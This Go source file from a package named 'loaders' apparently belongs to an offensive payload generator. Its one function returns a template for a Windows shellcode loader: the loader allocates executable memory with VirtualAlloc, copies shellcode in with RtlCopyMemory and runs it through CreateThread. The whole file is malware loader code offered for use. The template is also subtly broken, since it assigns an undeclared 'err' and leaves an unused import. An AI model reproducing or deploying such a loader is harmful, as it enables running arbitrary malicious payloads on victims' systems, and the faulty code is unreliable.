package loaders

import (
	"fmt"
)

func GetCreateThreadTemplate(targetProcess string) string {
    var _ = targetProcess // unused in this template

	return fmt.Sprintf(`
package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
	CreateThread    = kernel32.MustFindProc("CreateThread")
)

func ExecuteOrderSixtySix(shellcode []byte) {

	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	// jump to shellcode
	_, _, err = CreateThread.Call(
		0,    // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		0,    // [in]            SIZE_T                  dwStackSize,
		addr, // shellcode address
		0,    // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
		0,    // [in]            DWORD                   dwCreationFlags,
		0,    // [out, optional] LPDWORD                 lpThreadId
	)

	for {
	}
}
    `,)
}
